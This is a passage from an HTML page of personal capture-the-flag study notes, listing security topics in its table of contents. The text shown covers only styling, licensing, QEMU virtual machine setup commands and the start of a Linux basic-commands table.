<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang xml:lang>
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <meta name="author" content="Daniel Hiller" />
  <title>CTF</title>
  <style>
    html {
      line-height: 1.5;
      font-family: Georgia, serif;
      font-size: 20px;
      color: #1a1a1a;
      background-color: #fdfdfd;
    }
    body {
      margin: 0 auto;
      max-width: 36em;
      padding-left: 50px;
      padding-right: 50px;
      padding-top: 50px;
      padding-bottom: 50px;
      hyphens: auto;
      overflow-wrap: break-word;
      text-rendering: optimizeLegibility;
      font-kerning: normal;
    }
    @media (max-width: 600px) {
      body {
        font-size: 0.9em;
        padding: 1em;
      }
      h1 {
        font-size: 1.8em;
      }
    }
    @media print {
      body {
        background-color: transparent;
        color: black;
        font-size: 12pt;
      }
      p, h2, h3 {
        orphans: 3;
        widows: 3;
      }
      h2, h3, h4 {
        page-break-after: avoid;
      }
    }
    p {
      margin: 1em 0;
    }
    a {
      color: #1a1a1a;
    }
    a:visited {
      color: #1a1a1a;
    }
    img {
      max-width: 100%;
    }
    h1, h2, h3, h4, h5, h6 {
      margin-top: 1.4em;
    }
    h5, h6 {
      font-size: 1em;
      font-style: italic;
    }
    h6 {
      font-weight: normal;
    }
    ol, ul {
      padding-left: 1.7em;
      margin-top: 1em;
    }
    li > ol, li > ul {
      margin-top: 0;
    }
    blockquote {
      margin: 1em 0 1em 1.7em;
      padding-left: 1em;
      border-left: 2px solid #e6e6e6;
      color: #606060;
    }
    code {
      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
      font-size: 85%;
      margin: 0;
    }
    pre {
      margin: 1em 0;
      overflow: auto;
    }
    pre code {
      padding: 0;
      overflow: visible;
      overflow-wrap: normal;
    }
    .sourceCode {
     background-color: transparent;
     overflow: visible;
    }
    hr {
      background-color: #1a1a1a;
      border: none;
      height: 1px;
      margin: 1em 0;
    }
    table {
      margin: 1em 0;
      border-collapse: collapse;
      width: 100%;
      overflow-x: auto;
      display: block;
      font-variant-numeric: lining-nums tabular-nums;
    }
    table caption {
      margin-bottom: 0.75em;
    }
    tbody {
      margin-top: 0.5em;
      border-top: 1px solid #1a1a1a;
      border-bottom: 1px solid #1a1a1a;
    }
    th {
      border-top: 1px solid #1a1a1a;
      padding: 0.25em 0.5em 0.25em 0.5em;
    }
    td {
      padding: 0.125em 0.5em 0.25em 0.5em;
    }
    header {
      margin-bottom: 4em;
      text-align: center;
    }
    #TOC li {
      list-style: none;
    }
    #TOC ul {
      padding-left: 1.3em;
    }
    #TOC > ul {
      padding-left: 0;
    }
    #TOC a:not(:hover) {
      text-decoration: none;
    }
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    span.underline{text-decoration: underline;}
    div.column{display: inline-block; vertical-align: top; width: 50%;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    .sourceCode { overflow: visible; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
        color: #aaaaaa;
      }
    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
    div.sourceCode
      {   }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
    code span.at { color: #7d9029; } /* Attribute */
    code span.bn { color: #40a070; } /* BaseN */
    code span.bu { } /* BuiltIn */
    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #4070a0; } /* Char */
    code span.cn { color: #880000; } /* Constant */
    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
    code span.dt { color: #902000; } /* DataType */
    code span.dv { color: #40a070; } /* DecVal */
    code span.er { color: #ff0000; font-weight: bold; } /* Error */
    code span.ex { } /* Extension */
    code span.fl { color: #40a070; } /* Float */
    code span.fu { color: #06287e; } /* Function */
    code span.im { } /* Import */
    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
    code span.op { color: #666666; } /* Operator */
    code span.ot { color: #007020; } /* Other */
    code span.pp { color: #bc7a00; } /* Preprocessor */
    code span.sc { color: #4070a0; } /* SpecialChar */
    code span.ss { color: #bb6688; } /* SpecialString */
    code span.st { color: #4070a0; } /* String */
    code span.va { color: #19177c; } /* Variable */
    code span.vs { color: #4070a0; } /* VerbatimString */
    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
  </style>
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>
<header id="title-block-header">
<h1 class="title">CTF</h1>
<p class="author">Daniel Hiller</p>
</header>
<nav id="TOC" role="doc-toc">
<ul>
<li><a href="#ctf" id="toc-ctf"><span class="toc-section-number">1</span> CTF</a>
<ul>
<li><a href="#introduction" id="toc-introduction"><span class="toc-section-number">1.1</span> Introduction</a>
<ul>
<li><a href="#contributing" id="toc-contributing"><span class="toc-section-number">1.1.1</span> Contributing</a></li>
<li><a href="#license" id="toc-license"><span class="toc-section-number">1.1.2</span> License</a></li>
</ul></li>
<li><a href="#vm" id="toc-vm"><span class="toc-section-number">1.2</span> VM</a>
<ul>
<li><a href="#qemu" id="toc-qemu"><span class="toc-section-number">1.2.1</span> QEMU</a></li>
</ul></li>
<li><a href="#linux" id="toc-linux"><span class="toc-section-number">1.3</span> Linux</a>
<ul>
<li><a href="#basic-commands" id="toc-basic-commands"><span class="toc-section-number">1.3.1</span> Basic Commands</a></li>
<li><a href="#find" id="toc-find"><span class="toc-section-number">1.3.2</span> FIND</a></li>
<li><a href="#filter-content" id="toc-filter-content"><span class="toc-section-number">1.3.3</span> Filter Content</a>
<ul>
<li><a href="#grep" id="toc-grep"><span class="toc-section-number">1.3.3.1</span> Grep</a></li>
<li><a href="#cut" id="toc-cut"><span class="toc-section-number">1.3.3.2</span> Cut</a></li>
</ul></li>
<li><a href="#locate" id="toc-locate"><span class="toc-section-number">1.3.4</span> Locate</a></li>
<li><a href="#file-descriptors" id="toc-file-descriptors"><span class="toc-section-number">1.3.5</span> File Descriptors</a></li>
</ul></li>
<li><a href="#bash-scripting" id="toc-bash-scripting"><span class="toc-section-number">1.4</span> Bash Scripting</a>
<ul>
<li><a href="#operators" id="toc-operators"><span class="toc-section-number">1.4.0.1</span> Operators</a></li>
<li><a href="#file-operators" id="toc-file-operators"><span class="toc-section-number">1.4.0.2</span> File Operators</a></li>
<li><a href="#arguments" id="toc-arguments"><span class="toc-section-number">1.4.1</span> Arguments</a></li>
<li><a href="#special-variables" id="toc-special-variables"><span class="toc-section-number">1.4.2</span> Special Variables</a></li>
<li><a href="#variables" id="toc-variables"><span class="toc-section-number">1.4.3</span> Variables</a></li>
<li><a href="#arrays" id="toc-arrays"><span class="toc-section-number">1.4.4</span> Arrays</a></li>
<li><a href="#arithmetic" id="toc-arithmetic"><span class="toc-section-number">1.4.5</span> Arithmetic</a></li>
<li><a href="#input-control" id="toc-input-control"><span class="toc-section-number">1.4.6</span> Input Control</a></li>
<li><a href="#output-control" id="toc-output-control"><span class="toc-section-number">1.4.7</span> Output Control</a></li>
<li><a href="#loops" id="toc-loops"><span class="toc-section-number">1.4.8</span> Loops</a>
<ul>
<li><a href="#for-loops" id="toc-for-loops"><span class="toc-section-number">1.4.8.1</span> For Loops</a></li>
<li><a href="#while-loops" id="toc-while-loops"><span class="toc-section-number">1.4.8.2</span> While Loops</a></li>
<li><a href="#until-loops" id="toc-until-loops"><span class="toc-section-number">1.4.8.3</span> Until Loops</a></li>
</ul></li>
<li><a href="#switch-case" id="toc-switch-case"><span class="toc-section-number">1.4.9</span> Switch case</a></li>
<li><a href="#functions" id="toc-functions"><span class="toc-section-number">1.4.10</span> Functions</a>
<ul>
<li><a href="#parameter-passing" id="toc-parameter-passing"><span class="toc-section-number">1.4.10.1</span> Parameter Passing</a></li>
<li><a href="#return-values" id="toc-return-values"><span class="toc-section-number">1.4.10.2</span> Return Values</a></li>
</ul></li>
<li><a href="#debugging" id="toc-debugging"><span class="toc-section-number">1.4.11</span> Debugging</a></li>
<li><a href="#cheat-sheet" id="toc-cheat-sheet"><span class="toc-section-number">1.4.12</span> Cheat Sheet</a></li>
</ul></li>
<li><a href="#information-gathering" id="toc-information-gathering"><span class="toc-section-number">1.5</span> Information Gathering</a>
<ul>
<li><a href="#passive-information-gathering" id="toc-passive-information-gathering"><span class="toc-section-number">1.5.1</span> Passive Information
Gathering</a>
<ul>
<li><a href="#dig" id="toc-dig"><span class="toc-section-number">1.5.1.1</span> DIG</a></li>
<li><a href="#project-sonar" id="toc-project-sonar"><span class="toc-section-number">1.5.1.2</span> Project Sonar</a></li>
<li><a href="#certificates" id="toc-certificates"><span class="toc-section-number">1.5.1.3</span> Certificates</a></li>
</ul></li>
<li><a href="#active-information-gathering" id="toc-active-information-gathering"><span class="toc-section-number">1.5.2</span> Active Information Gathering</a>
<ul>
<li><a href="#whatweb" id="toc-whatweb"><span class="toc-section-number">1.5.2.1</span> WhatWeb</a></li>
<li><a href="#active-subdomain-enumeration-zone-transfer" id="toc-active-subdomain-enumeration-zone-transfer"><span class="toc-section-number">1.5.2.2</span> Active Subdomain Enumeration
(Zone transfer)</a></li>
<li><a href="#gobuster---dns" id="toc-gobuster---dns"><span class="toc-section-number">1.5.2.3</span> Gobuster - DNS</a></li>
</ul></li>
</ul></li>
<li><a href="#ffuf" id="toc-ffuf"><span class="toc-section-number">1.6</span> ffuf</a>
<ul>
<li><a href="#performance" id="toc-performance"><span class="toc-section-number">1.6.1</span> Performance</a></li>
<li><a href="#directory-fuzzing" id="toc-directory-fuzzing"><span class="toc-section-number">1.6.2</span> Directory Fuzzing</a></li>
<li><a href="#page-fuzzing" id="toc-page-fuzzing"><span class="toc-section-number">1.6.3</span> Page Fuzzing</a>
<ul>
<li><a href="#page-fuzzing-1" id="toc-page-fuzzing-1"><span class="toc-section-number">1.6.3.1</span> Page Fuzzing</a></li>
</ul></li>
<li><a href="#recursive-fuzzing" id="toc-recursive-fuzzing"><span class="toc-section-number">1.6.4</span> Recursive Fuzzing</a></li>
<li><a href="#subdomain-fuzzing" id="toc-subdomain-fuzzing"><span class="toc-section-number">1.6.5</span> Subdomain Fuzzing</a></li>
<li><a href="#vhost-fuzzing" id="toc-vhost-fuzzing"><span class="toc-section-number">1.6.6</span> Vhost Fuzzing</a></li>
<li><a href="#parameter-fuzzing" id="toc-parameter-fuzzing"><span class="toc-section-number">1.6.7</span> Parameter Fuzzing</a>
<ul>
<li><a href="#get-request" id="toc-get-request"><span class="toc-section-number">1.6.7.1</span> GET Request</a></li>
<li><a href="#post-request" id="toc-post-request"><span class="toc-section-number">1.6.7.2</span> POST Request</a></li>
<li><a href="#value-fuzzing" id="toc-value-fuzzing"><span class="toc-section-number">1.6.7.3</span> Value Fuzzing</a></li>
</ul></li>
</ul></li>
<li><a href="#exploiting-network-services" id="toc-exploiting-network-services"><span class="toc-section-number">1.7</span> Exploiting Network Services</a>
<ul>
<li><a href="#github-repos" id="toc-github-repos"><span class="toc-section-number">1.7.1</span> GitHub Repos</a></li>
<li><a href="#ssh" id="toc-ssh"><span class="toc-section-number">1.7.2</span> SSH</a></li>
<li><a href="#nmap" id="toc-nmap"><span class="toc-section-number">1.7.3</span> NMAP</a></li>
<li><a href="#ftp" id="toc-ftp"><span class="toc-section-number">1.7.4</span> FTP</a>
<ul>
<li><a href="#hydra" id="toc-hydra"><span class="toc-section-number">1.7.4.1</span> Hydra</a></li>
</ul></li>
<li><a href="#nfs" id="toc-nfs"><span class="toc-section-number">1.7.5</span> NFS</a></li>
<li><a href="#smtp" id="toc-smtp"><span class="toc-section-number">1.7.6</span> SMTP</a></li>
<li><a href="#metasploit" id="toc-metasploit"><span class="toc-section-number">1.7.7</span> Metasploit</a></li>
<li><a href="#sql-injection" id="toc-sql-injection"><span class="toc-section-number">1.7.8</span> SQL injection</a>
<ul>
<li><a href="#types" id="toc-types"><span class="toc-section-number">1.7.8.1</span> Types</a></li>
<li><a href="#sqli-discovery" id="toc-sqli-discovery"><span class="toc-section-number">1.7.8.2</span> SQLi Discovery</a></li>
<li><a href="#comments" id="toc-comments"><span class="toc-section-number">1.7.8.3</span> Comments</a></li>
<li><a href="#union-clause" id="toc-union-clause"><span class="toc-section-number">1.7.8.4</span> Union Clause</a></li>
</ul></li>
<li><a href="#mysql" id="toc-mysql"><span class="toc-section-number">1.7.9</span> MySQL</a></li>
<li><a href="#john-the-ripper" id="toc-john-the-ripper"><span class="toc-section-number">1.7.10</span> John the Ripper</a></li>
<li><a href="#hashcat" id="toc-hashcat"><span class="toc-section-number">1.7.11</span> Hashcat</a></li>
</ul></li>
<li><a href="#web-fundamentals" id="toc-web-fundamentals"><span class="toc-section-number">1.8</span> Web Fundamentals</a>
<ul>
<li><a href="#http" id="toc-http"><span class="toc-section-number">1.8.1</span> HTTP</a>
<ul>
<li><a href="#get-request-1" id="toc-get-request-1"><span class="toc-section-number">1.8.1.1</span> GET Request</a></li>
<li><a href="#post-request-1" id="toc-post-request-1"><span class="toc-section-number">1.8.1.2</span> POST Request</a></li>
<li><a href="#put-request" id="toc-put-request"><span class="toc-section-number">1.8.1.3</span> PUT Request</a></li>
<li><a href="#delete-request" id="toc-delete-request"><span class="toc-section-number">1.8.1.4</span> DELETE Request</a></li>
</ul></li>
<li><a href="#curl" id="toc-curl"><span class="toc-section-number">1.8.2</span> Curl</a></li>
<li><a href="#web-applications" id="toc-web-applications"><span class="toc-section-number">1.8.3</span> Web Applications</a>
<ul>
<li><a href="#netcat" id="toc-netcat"><span class="toc-section-number">1.8.3.1</span> Netcat</a></li>
<li><a href="#socat" id="toc-socat"><span class="toc-section-number">1.8.3.2</span> Socat</a></li>
<li><a href="#stabilize-shell" id="toc-stabilize-shell"><span class="toc-section-number">1.8.3.3</span> Stabilize Shell</a></li>
</ul></li>
<li><a href="#privilege-escalation" id="toc-privilege-escalation"><span class="toc-section-number">1.8.4</span> Privilege Escalation</a>
<ul>
<li><a href="#exploiting-suid" id="toc-exploiting-suid"><span class="toc-section-number">1.8.4.1</span> Exploiting SUID</a></li>
</ul></li>
</ul></li>
<li><a href="#sql-injection-sqli" id="toc-sql-injection-sqli"><span class="toc-section-number">1.9</span> SQL injection (SQLi)</a>
<ul>
<li><a href="#mysql-basics" id="toc-mysql-basics"><span class="toc-section-number">1.9.1</span> MySQL Basics</a>
<ul>
<li><a href="#operators-1" id="toc-operators-1"><span class="toc-section-number">1.9.1.1</span> Operators</a></li>
</ul></li>
</ul></li>
</ul></li>
</ul>
</nav>
<h1 data-number="1" id="ctf"><span class="header-section-number">1</span> CTF</h1>
<h2 data-number="1.1" id="introduction"><span class="header-section-number">1.1</span> Introduction</h2>
<h3 data-number="1.1.1" id="contributing"><span class="header-section-number">1.1.1</span> Contributing</h3>
<p><strong>Found an error or have a suggestion?</strong> Please open an
issue on GitHub (<a href="https://github.com/dentremor/Software-Defined-Infrastrucure">github.com/dentremor/Software-Defined-Infrastrucure</a>):</p>
<figure>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAXIAAAFyAQAAAADAX2ykAAACjklEQVR4nO2bTW6kQAyF3xtKyhKkHKCPUtxsNEeaG1BHyQEiUcuWQG8WNqEzk18NISC5FkjQ3+JJ7lfYLkPhM6v8+BQOBB988MEHH3zwr/H0lUB2AMkElA4A6vJbv6Oe4DfmsyRpBDRgJvIIID8kAGgkSXrOf7We4DfmqzuUfb0TyuVK9y8WO++rJ/iv4c2/qHdij5nfrif4jfksSUM7QUOrf4vjw+sP/kW+lTQA4JNr2S8XSdPeeoLfhvcXa7GYNgDqvZgf0oT8O03AX5v00fQH//ay+K77sErXQKgzgXYC0D7fo4+mP/iP8OxrAlBJZF2J0jWCW3cmUBPY76gn+C/gyYvkVVF79V25MN3eHll/8C8t615obIQ8NlqeTbD9OY8AgEaeWB9Nf/DvrLU5tVZFGiy0jYBWdrEV8T0Z7/4dAEgjAGCJapb71/4C4d8z8pY/M48diFYg2kcKmBNK9/iEzUuD8mj6g39nLf5tBLeu9zJ8uwaspxX+PSW/+NJcCwA1Qaj3E/NDMmMLeCqRj6Y/+E/wlXY0SHaAvYS9EvZO5cH1B/8qb6eCS648YKZ+dTOlcaYFfl89wW/De37lF0KFALLmxDzOgOdcAvfRE/y2/E1/w7oaefTUyupfuyzlb+RXZ+OX/kbr8zlYk+i8TuW0EyK+J+Y9tHagP9Nva1qCbOMc++kJflt+nZ+0hnNZB64syHG+f27+Zn7ypvV85dru2FdP8Bvzy/yknQ+WbqaGmoBC3kxSHld/8B/lq2/N5MXmN7Q+O4P+4N/i2bcSf2qC1UwDAJvp+B49wf8ff3v4Z0Xw6PWRn/nLTRz10Zn5QtI/Pbpc7dXL3lKr6D+fmWd83x188MEHH3zwu/N/AMqrho6Gg6voAAAAAElFTkSuQmCC" width="150" alt="QR code to source repository" />
<figcaption aria-hidden="true">QR code to source repository</figcaption>
</figure>
<h3 data-number="1.1.2" id="license"><span class="header-section-number">1.1.2</span> License</h3>
<figure>
<img src="data:image/png;base64,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" width="128" alt="AGPL-3.0 license badge" />
<figcaption aria-hidden="true">AGPL-3.0 license badge</figcaption>
</figure>
<p>Software Defined Infrastructure (c) 2021 Daniel Hiller and
contributors</p>
<p>SPDX-License-Identifier: AGPL-3.0 </p>
<h2 data-number="1.2" id="vm"><span class="header-section-number">1.2</span> VM</h2>
<h3 data-number="1.2.1" id="qemu"><span class="header-section-number">1.2.1</span> QEMU</h3>
<p>To create a disk image run the following command:</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">qemu-img</span> create <span class="at">-f</span> qcow2 disk.qcow2 64G</span></code></pre></div>
<p>The VM can be executed with a bash script (remove Image.iso with the
distro image of your choice):</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">qemu-system-x86_64</span> <span class="at">-enable-kvm</span> <span class="at">-m</span> 4096 <span class="at">-smp</span> <span class="va">$(</span><span class="fu">nproc</span><span class="va">)</span> <span class="at">-cpu</span> host <span class="at">-device</span> ac97 <span class="at">-audiodev</span> alsa,id=snd0,out.buffer-length=500000,out.period-length=726 <span class="at">-display</span> default,show-cursor=on <span class="at">-usb</span> <span class="at">-device</span> usb-tablet <span class="at">-device</span> virtio-keyboard-pci <span class="at">-net</span> nic <span class="at">-net</span> user <span class="at">-cdrom</span> distro.iso <span class="at">-device</span> virtio-vga-gl <span class="at">-display</span> sdl,gl=on <span class="at">-hda</span> disk.qcow2 <span class="at">-bios</span> /usr/share/edk2/ovmf/OVMF_CODE.fd</span></code></pre></div>
<p>If you also have a 4k-panel, you probably will face some scaling
issues like me. In that case make sure you use <code>Wayland</code>
instead of <code>X11</code>.</p>
<h2 data-number="1.3" id="linux"><span class="header-section-number">1.3</span> Linux</h2>
<h3 data-number="1.3.1" id="basic-commands"><span class="header-section-number">1.3.1</span> Basic Commands</h3>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>whoami</code></td>
<td>Displays current username.</td>
</tr>
<tr class="even">
<td><code>wc</code></td>
